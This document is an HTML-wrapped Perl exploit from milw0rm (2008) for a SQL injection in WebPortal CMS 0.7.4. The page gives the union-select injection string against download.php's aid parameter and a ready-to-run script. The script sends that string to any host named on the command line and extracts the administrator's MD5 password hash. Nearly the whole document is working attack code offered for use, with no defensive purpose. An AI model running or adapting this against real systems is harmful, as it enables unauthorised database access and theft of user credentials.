<html><head><title>WebPortal CMS <= 0.7.4 (download.php aid) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# --==+============================================================================+==--
# --==+            WebPortal &lt;= 0.7.4 Remote SQL Injection Exploit                 +==--    
# --==+============================================================================+==--
# 
#  [*] Discovered By: StAkeR ~ StAkeR@hotmail.it
#  [+] Discovered On: 12 Sep 2008
#  [+] Download: http://webportal.ivanoculmine.com/download.php?mid=14
#  
#  [*] SQL Injection
#  [+] download.php?aid=1'+union+select+pass,0,0,0,0+from+portal_users+where+id='1
#  [+] get file &quot;download.php&quot; and you can read 
#  
#  [*] Exploit:
#  
 # ----------------------------------------------------------
 # WebPortal &lt;= 0.7.4 Remote SQL Injection Exploit 
 # Author: StAkeR - StAkeR[at]hotmail[dot]it
 # ----------------------------------------------------------
 # Usage: perl http://localhost/cms 
 # ----------------------------------------------------------

 use strict;
 use LWP::Simple;


 my $domain = shift @ARGV or banner();
 my $injsql = &quot;/download.php?aid=1'+union+select+pass,0,0,0,0+from+portal_users+where+id='1&quot;;

 if(get($domain.$injsql) =~ /([0-9a-f]{32})/)
 {
   print &quot;[+] Exploit Succesfull!\n&quot;;
   print &quot;[+] MD5 Password: ${1}\n&quot;;
 }
 else
 {
   print &quot;[!] Exploit Failed!\n&quot;;
   print &quot;[!] Site Not Vulnerable!\n&quot;;
 }

 sub banner
 {
   print &quot;[+] WebPortal &lt;= 0.7.4 Remote SQL Injection Exploit\n&quot;;
   print &quot;[+] Usage: ${0} http://[host]\n&quot;;
   return exit;
 }

# milw0rm.com [2008-09-12]</pre></html>